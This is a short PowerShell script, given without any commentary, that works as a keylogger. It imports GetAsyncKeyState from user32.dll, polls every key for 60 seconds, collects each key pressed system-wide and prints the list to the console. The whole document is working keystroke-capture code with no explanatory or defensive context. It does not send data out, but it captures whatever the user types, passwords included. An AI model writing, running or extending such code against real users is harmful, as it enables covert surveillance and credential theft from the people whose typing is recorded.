$ImportDll = Add-Type -Namespace Win32 -Name User32 -PassThru -MemberDefinition '
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(System.ConsoleKey vKey);
'

function Get-Keystrokes {
    $stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
    $keystrokes = @()

    while ($stopwatch.Elapsed.TotalSeconds -lt 60) {
        foreach ($key in [Enum]::GetValues([System.ConsoleKey])) {
            $keyState = $ImportDll::GetAsyncKeyState($key)
            if ($keyState -eq -32767) {
                $keystrokes += $key.ToString()
            }
        }
        Start-Sleep -Milliseconds 10
    }

    $keystrokes
}

Get-Keystrokes | ForEach-Object { Write-Host $_ }
